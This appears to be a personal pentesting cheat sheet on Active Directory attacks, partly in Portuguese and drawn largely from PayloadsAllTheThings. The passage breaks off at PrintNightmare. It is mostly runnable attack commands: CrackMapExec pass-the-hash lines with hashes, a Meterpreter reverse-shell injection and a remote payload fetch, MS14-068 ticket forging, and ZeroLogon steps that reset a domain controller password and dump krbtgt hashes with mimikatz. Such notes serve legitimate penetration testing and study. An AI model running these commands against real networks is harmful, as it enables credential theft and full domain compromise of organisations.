AD exploitation
========================
# Active Directory Attacks

## Summary

- [Active Directory Attacks](AD%20exploitation.txt#active-directory-attacks)
  - [Summary](AD%20exploitation.txt#summary)
  - [Tools](AD%20exploitation.txt#Tools)
  - [Active Directory Recon](AD%20exploitation.txt#Active-Directory-Recon)
    - [Using BloodHound](AD%20exploitation.txt#using-bloodhound)
    - [Using PowerView](AD%20exploitation.txt#using-powerview)
    - [Using AD Module](AD%20exploitation.txt#using-ad-module)
  - [Most common paths to AD compromise](AD%20exploitation.txt#most-common-paths-to-ad-compromise)
    - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](AD%20exploitation.txt#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
    - [From CVE to SYSTEM shell on DC](AD%20exploitation.txt#from-cve-to-system-shell-on-dc)
      - [ZeroLogon](AD%20exploitation.txt#zerologon)
      - [PrintNightmare](AD%20exploitation.txt#printnightmare)
    - [Open Shares](AD%20exploitation.txt#open-shares)
    - [SCF and URL file attack against writeable share](AD%20exploitation.txt#scf-and-url-file-attack-against-writeable-share)
    - [Passwords in SYSVOL & Group Policy Preferences](AD%20exploitation.txt#passwords-in-sysvol-&-group-policy-preferences)
    - [Exploit Group Policy Objects GPO](AD%20exploitation.txt#exploit-group-policy-objects-gpo)
      - [Find vulnerable GPO](AD%20exploitation.txt#find-vulnerable-gpo)
      - [Abuse GPO with SharpGPOAbuse](AD%20exploitation.txt#abuse-gpo-with-sharpgpoabuse)
      - [Abuse GPO with PowerGPOAbuse](AD%20exploitation.txt#abuse-gpo-with-powergpoabuse)
      - [Abuse GPO with pyGPOAbuse](AD%20exploitation.txt#abuse-gpo-with-pygpoabuse)
      - [Abuse GPO with PowerView](AD%20exploitation.txt#abuse-gpo-with-powerview)
      - [Abuse GPO with StandIn](AD%20exploitation.txt#abuse-gpo-with-standin)
    - [Dumping AD Domain Credentials](AD%20exploitation.txt#dumping-ad-domain-credentials)
      - [Using ndtsutil](AD%20exploitation.txt#using-ndtsutil)
      - [Using Vshadow](AD%20exploitation.txt#using-vshadow)
      - [Using vssadmin](AD%20exploitation.txt#using-vssadmin)
      - [Using DiskShadow (a Windows signed binary)](AD%20exploitation.txt#using-diskshadow-a-windows-signed-binary)
      - [Using esentutl.exe](AD%20exploitation.txt#using-esentutlexe)
      - [Extract hashes from ntds.dit](AD%20exploitation.txt#extract-hashes-from-ntdsdit)
      - [Alternatives - modules](AD%20exploitation.txt#alternatives---modules)
      - [Using Mimikatz DCSync](AD%20exploitation.txt#using-mimikatz-dcsync)
      - [Using Mimikatz sekurlsa](AD%20exploitation.txt#using-mimikatz-sekurlsa)
    - [Password spraying](AD%20exploitation.txt#password-spraying)
      - [Kerberos pre-auth bruteforcing](AD%20exploitation.txt#kerberos-pre-auth-bruteforcing)
      - [Spray a pre-generated passwords list](AD%20exploitation.txt#spray-a-pre-generated-passwords-list)
      - [Spray passwords against the RDP service](AD%20exploitation.txt#spray-passwords-against-the-rdp-service)
      - [BadPwdCount attribute](AD%20exploitation.txt#badpwdcount-attribute)
    - [Password in AD User comment](AD%20exploitation.txt#password-in-ad-user-comment)
    - [Reading LAPS Password](AD%20exploitation.txt#reading-laps-password)
    - [Reading GMSA Password](AD%20exploitation.txt#reading-gmsa-password)
    - [Pass-the-Ticket Golden Tickets](AD%20exploitation.txt#pass-the-ticket-golden-tickets)
      - [Using Mimikatz](AD%20exploitation.txt#using-mimikatz)
      - [Using Meterpreter](AD%20exploitation.txt#using-meterpreter)
      - [Using a ticket on Linux](AD%20exploitation.txt#using-a-ticket-on-linux)
    - [Pass-the-Ticket Silver Tickets](AD%20exploitation.txt#pass-the-ticket-silver-tickets)
    - [Kerberoasting](AD%20exploitation.txt#kerberoasting)
    - [KRB_AS_REP Roasting](AD%20exploitation.txt#krbasrep-roasting)
    - [Shadow Credentials](AD%20exploitation.txt#shadow-credentials)
    - [Pass-the-Hash](AD%20exploitation.txt#pass-the-hash)
    - [OverPass-the-Hash (pass the key)](AD%20exploitation.txt#overpass-the-hash-pass-the-key)
      - [Using impacket](AD%20exploitation.txt#using-impacket)
      - [Using Rubeus](AD%20exploitation.txt#using-rubeus)
    - [Capturing and cracking NTLMv2 hashes](AD%20exploitation.txt#capturing-and-cracking-ntlmv2-hashes)
    - [Man-in-the-Middle attacks & relaying](AD%20exploitation.txt#man-in-the-middle-attacks--relaying)
      - [MS08-068 NTLM reflection](AD%20exploitation.txt#ms08-068-ntlm-reflection)
      - [SMB Signing Disabled and IPv4](AD%20exploitation.txt#smb-signing-disabled-and-ipv4)
      - [SMB Signing Disabled and IPv6](AD%20exploitation.txt#smb-signing-disabled-and-ipv6)
      - [Drop the MIC](AD%20exploitation.txt#drop-the-mic)
      - [Ghost Potato - CVE-2019-1384](AD%20exploitation.txt#ghost-potato---cve-2019-1384)
      - [RemotePotato0 DCOM DCE RPC relay](AD%20exploitation.txt#remotepotato0-dcom-dce-rpc-relay)
      - [AD CS Relay Attack](AD%20exploitation.txt#ad-cs-relay-attack)
    - [Dangerous Built-in Groups Usage](AD%20exploitation.txt#dangerous-built-in-groups-usage)
    - [Abusing Active Directory ACLs/ACEs](AD%20exploitation.txt#abusing-active-directory-aclsaces)
      - [GenericAll](AD%20exploitation.txt#genericall)
      - [GenericWrite](AD%20exploitation.txt#genericwrite)
      	- [GenericWrite and Remote Connection Manager](AD%20exploitation.txt#genericwrite-and-remote-connection-manager)
      - [WriteDACL](AD%20exploitation.txt#writedacl)
      - [WriteOwner](AD%20exploitation.txt#writeowner)
      - [ReadLAPSPassword](AD%20exploitation.txt#readlapspassword)
      - [ReadGMSAPassword](AD%20exploitation.txt#readgmsapassword)
      - [ForceChangePassword](AD%20exploitation.txt#forcechangepassword)
    - [DCOM Exploitation](AD%20exploitation.txt#dcom-exploitation)
      - [DCOM via MMC Application Class](AD%20exploitation.txt#dcom-via-mmc-application-class) 
      - [DCOM via Excel](AD%20exploitation.txt#dcom-via-excel)
      - [DCOM via ShellExecute](AD%20exploitation.txt#dcom-via-shellexecute)
    - [Trust relationship between domains](AD%20exploitation.txt#trust-relationship-between-domains)
    - [Child Domain to Forest Compromise - SID Hijacking](AD%20exploitation.txt#child-domain-to-forest-compromise---sid-hijacking)
    - [Forest to Forest Compromise - Trust Ticket](AD%20exploitation.txt#forest-to-forest-compromise---trust-ticket)
    - [Kerberos Unconstrained Delegation](AD%20exploitation.txt#kerberos-unconstrained-delegation)
      - [SpoolService Abuse with Unconstrained Delegation](AD%20exploitation.txt#spoolservice-abuse-with-unconstrained-delegation)
      - [MS-EFSRPC Abuse with Unconstrained Delegation](AD%20exploitation.txt#ms---efsrpc-abuse-with-unconstrained-delegation)
    - [Kerberos Constrained Delegation](AD%20exploitation.txt#kerberos-constrained-delegation)
    - [Kerberos Resource Based Constrained Delegation](AD%20exploitation.txt#kerberos-resource-based-constrained-delegation)
    - [Kerberos Bronze Bit Attack - CVE-2020-17049](AD%20exploitation.txt#kerberos-bronze-bit-attack---cve-2020-17049)
    - [Relay delegation with mitm6](AD%20exploitation.txt#relay-delegation-with-mitm6)
    - [PrivExchange attack](AD%20exploitation.txt#privexchange-attack)
    - [PXE Boot image attack](AD%20exploitation.txt#pxe-boot-image-attack)
    - [DSRM Credentials](AD%20exploitation.txt#dsrm-credentials)
    - [DNS Reconnaissance](AD%20exploitation.txt#dns-reconnaissance)
    - [Impersonating Office 365 Users on Azure AD Connect](AD%20exploitation.txt#impersonating-office-365-users-on-azure-ad-connect)
  - [Linux Active Directory](AD%20exploitation.txt#linux-active-directory)
    - [CCACHE ticket reuse from /tmp](AD%20exploitation.txt#ccache-ticket-reuse-from-tmp)
    - [CCACHE ticket reuse from keyring](AD%20exploitation.txt#ccache-ticket-reuse-from-keyring)
    - [CCACHE ticket reuse from SSSD KCM](AD%20exploitation.txt#ccache-ticket-reuse-from-sssd-kcm)
    - [CCACHE ticket reuse from keytab](AD%20exploitation.txt#ccache-ticket-reuse-from-keytab)
    - [Extract accounts from /etc/krb5.keytab](AD%20exploitation.txt#extract-accounts-from-etckrb5keytab)
  - [References](AD%20exploitation.txt#references)

## Tools

* [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
* [Responder](https://github.com/lgandx/Responder)
* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)


   execute cme (smb, winrm, mssql, ...)
  root@payload$ cme smb -L
  root@payload$ cme smb -M name_module -o VAR=DATA
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
  root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
  root@payload$ cme mimikatz --server http --server-port 80
  ```


* [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
    ```

* [Kerbrute](https://github.com/ropnop/kerbrute)

    ```powershell
    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)

    ```powershell
    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
    Rubeus.exe klist [/luid:LOGINID]
    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
    ```

* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
    ```powershell
    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
    Install-Lab
    Show-LabDeploymentSummary
    ```

## Active Directory Recon

### Locally

    net user
    
    net user /domain
    
    net group /domain
    
    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    
#### usando powershell

Filtros que podemos usar são:

##### servicePrincipalNames
    $ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"

##### grupos
    $ldapFilter = "(objectClass=Group)"

##### usuarios
    $ldapFilter = "samAccountType=805306368"

    $domain = New-Object System.DirectoryServices.DirectoryEntry
    $search = New-Object System.DirectoryServices.DirectorySearcher
    $search.SearchRoot = $domain
    $search.PageSize = 1000
    $search.Filter = $ldapFilter
    $search.SearchScope = "Subtree"
    #Execute Search
    $results = $search.FindAll()
    #Display SPN values from the returned objects
    foreach ($result in $results)
    {
        $userEntry = $result.GetDirectoryEntry()
        Write-Host "User Name = " $userEntry.name
        foreach ($SPN in $userEntry.servicePrincipalName)
            {
                Write-Host "SPN = " $SPN      
            }
        Write-Host ""   
    }

#### oneliner (grupos)
 
     $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
 
#### oneliner (sub grupos)
 
     $ldapFilter = "(name=Service Accounts)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.member}
     
     #Offsec  script


#### Nested groups     
     $ldap_filter = "(name=Service Accounts)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}

#### Service Principal Names
     $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*http*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
     

## Remotely

### Para máquinas fora do domínio

 Executar com o comando "runas" e "/netonly" para envio de credenciais somente pela rede
 
     runas /netonly /user:redecorp.br\a0106003 powershell

Dessa forma a credencial vai pela rede e se autentica nos protocolos do active directory

### Searching for Domain Controller

#### linux 
    
    nslookup -type=srv _ldap._tcp.dc._msdcs.redecorp.br
    nslookup -type=srv _kerberos._tcp.EXMAPLE.COM
    nslookup -type=srv _kpasswd._tcp.EXAMPLE.COM
    nslookup -type=srv _ldap._tcp.EXAMPLE.COM
    nslookup -type=srv _ldap._tcp.dc._msdcs.EXAMPLE.COM


#### windows

    nslookup
    set type=all
    _ldap._tcp.dc._msdcs.redecorp.br

    nltest /dclist:oscp.exam

Outra opção seria:

        nltest /dclist:domainname

*Vale considerar que este comando só funciona se a máquina já está no domínio*

![qownnotes-media-hrusya](../../media/qownnotes-media-hrusya.png)

Onde redecorp.br é o nome do domínio e, neste caso foi o domínio utilizado como exemplo


### Using rpc
    rpcclient -U '%' [target]  ## Null session testing

### using nmap
    nmap --script "ldap* and not brute" [target]
    

### Using BloodHound

```powershell

# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23

# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

# or remotely via BloodHound Python
# https://github.com/fox-it/BloodHound.py
pip install bloodhound
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
```

Then import the zip/json files into the Neo4J database and query them.

```powershell
root@payload$ apt install bloodhound 

# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j

root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
```


### Using PowerView
  
- **Get Current Domain:** `Get-NetDomain`
- **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:** 
  ```
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  (Get-DomainPolicy)."system access"
  (Get-DomainPolicy)."kerberos policy"
  ```
- **Get Domain Controlers:** 

```
      Get-NetDomainController
      Get-NetDomainController -Domain <DomainName>
```

- **Enumerate Domain Users:** 
```
  Get-NetUser
  Get-NetUser -SamAccountName <user> 
  Get-NetUser | select cn
  Get-UserProperty

  #Check last password change
  Get-UserProperty -Properties pwdlastset

  #Get a spesific "string" on a user's attribute
  Find-UserField -SearchField Description -SearchTerm "wtver"
  
  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>
  
  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>
  
  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

- **Enum Domain Computers:** 
```
  Get-NetComputer -FullData
  Get-DomainGroup

  #Enumerate Live machines 
  Get-NetComputer -Ping
```
- **Enum Groups and Group Members:**
```
  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
  
  #Enumerate the members of a specified group of the domain
  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
  
  #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```
- **Enumerate Shares**
```
  #Enumerate Domain Shares
  Find-DomainShare
  
  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess
```
- **Enum Group Policies:** 
```
  Get-NetGPO

   Shows active Policy on specified machine
  Get-NetGPO -ComputerName <Name of the PC>
  Get-NetGPOGroup

  #Get users that are part of a Machine's local Admin group
  Find-GPOComputerAdmin -ComputerName <ComputerName>
```
- **Enum OUs:** 
```
  Get-NetOU -FullData 
  Get-NetGPO -GPOname <The GUID of the GPO>
```
- **Enum ACLs:** 
```
  Returns the ACLs associated with the specified account
  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

  #Search for interesting ACEs
  Invoke-ACLScanner -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
```
- **Enum Domain Trust:** 
  ```
  Get-NetDomainTrust
  Get-NetDomainTrust -Domain <DomainName>
  ```
- **Enum Forest Trust:** 
  ```
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Domains of Forest Enumeration
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Map the Trust of the Forest
  Get-NetForestTrust
  Get-NetDomainTrust -Forest <ForestName>
  ```
- **User Hunting:** 
  ```
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain:
  Invoke-EnumerateLocalAdmin -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth
  
  
- #Confirming admin access:
  Invoke-UserHunter -CheckAccess
  ```
  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him ->   
  Profit!

  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Using LDAP (with credentials or null session)

Vale ressaltar que o ldapsearch equivale ao:

    net user /domain

    ldapsearch -x -h 10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "cn=users,dc=intelligence,dc=htb"
    
Command options explained:

-x use simple authentication (as opposed to SASL)
-h your AD server
-D the DN to bind to the directory. In other words, the user you are authenticating with.
-W Prompt for the password. The password should match what is in your directory for the the binddn (-D). Mutually exclusive from -w.
-b The starting point for the search


Tentando ler algum arquivo com ldap

    ldapsearch --hostname localhost --port 1389 --bindDN "cn=Directory Manager" --bindPassword password --baseDN dc=example,dc=com --filename myfilter.txt dn: uid=bjensen,ou=People,dc=example,dc=com 



### Using AD Module

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controlers:** 
```
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
```
- **Enumerate Domain Users:** 
```
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a spesific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
```
- **Enum Domain Computers:** 
```
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter * 
```
- **Enum Domain Trust:** 
```
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
```
- **Enum Forest Trust:** 
```
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
```
 - **Enum Local AppLocker Effective Policy:**
```
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## With Users

    impacket-GetNPUsers -dc-ip 10.10.11.152 timelapse.htb/ -usersfile users.txt -format john -outputfile hashes
    
    

## Most common paths to AD compromise

### MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)

This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.

```powershell
# remote
rpcclient $> lookupnames john.smith
john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)

# loc
wmic useraccount get name,sid
Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
Guest          S-1-5-21-3415849876-833628785-5197346142-501   
Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
Guest          S-1-5-21-297520375-2634728305-5197346142-501   
krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
lambda         S-1-5-21-297520375-2634728305-5197346142-1110 

# powerview
Convert-NameToSid high-sec-corp.localkrbtgt
S-1-5-21-2941561648-383941485-1389968811-502
```

```bash
Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
```

Generate a ticket with `metasploit` or `pykek`

```powershell
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
   Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       yes       The Domain User password
   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      lambda                                         yes       The Domain User
   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000
```

```powershell
# Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
$ git clone https://github.com/SecWiki/windows-kernel-exploits
$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
```

Then use `mimikatz` to load the ticket.

```powershell
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```

:warning: If the clock is skewed use `clock-skew.nse` script from `nmap`

```powershell
Linux> $ nmap -sV -sC 10.10.10.10
clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s

Linux> sudo date -s "14 APR 2015 18:25:16" 
Windows> net time /domain /set
```

#### Mitigations

* Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780

### From CVE to SYSTEM shell on DC

> Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)


#### ZeroLogon

> CVE-2020-1472

White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055

Exploit steps from the white paper

1. Spoofing the client credential
2. Disabling signing and sealing
3. Spoofing a call
4. Changing a computer's AD password to null
5. From password change to domain admin
6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service

* `cve-2020-1472-exploit.py` - Python script from dirkjanm
  ```powershell
  $ git clone https://github.com/dirkjanm/CVE-2020-1472.git

 # Activate a virtual env to install impacket
  
      $ python3 -m venv venv
      $ source venv/bin/activate
      $ pip3 install .

 ### Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
  
      proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

  # Find the old NT hash of the DC
  proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

  # Restore password from secretsdump 
  # secretsdump will automatically dump the plaintext machine password (hex encoded) 
  # when dumping the local registry secrets on the newest version
  
      python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
  deactivate
  ```

* `nccfsas` - .NET binary for Cobalt Strike's execute-assembly
  ```powershell
  git clone https://github.com/nccgroup/nccfsas
  # Check
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local

  # Resetting the machine account password

      execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset

  # Testing from a non Domain-joined machine

      execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch

  # Now reset the password back
  ```

* `Mimikatz` - 2.2.0 20200917 Post-Zerologon
  ```powershell
  privilege::debug

  # Check for the CVE
  lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$

  # Exploit the CVE and set the computer account's password to ""

      lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit

  # Execute dcsync to extract some hashes

      lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
      lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm

  # Pass The Hash with the extracted Domain Admin hash
  sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN

  Use IP address instead of FQDN to force NTLM with Windows APIs 
  Reset password to Waza1234/Waza1234/Waza1234/
  https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
  
  lsadump::postzerologon /target:10.10.10.10 /account:DC01$
  ```

#### PrintNightmare

> CVE-2021-1675 / CVE-2021-34527

The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
The exploit will execute the DLL either from the local filesystem or a remote share.

Requirements:
* **Spooler Service** enabled (Mandatory)
* Server with patches < June 21
* DC with `Pre Windows 2000 Compatibility` group
* Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
* Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0


**Detect the vulnerability**:
* Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
  ```ps1
  python3 ./rpcdump.py @10.0.2.10 | grep MS-RPRN
  Protocol: [MS-RPRN]: Print System Remote Protocol
  ```
* [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
  ```ps1
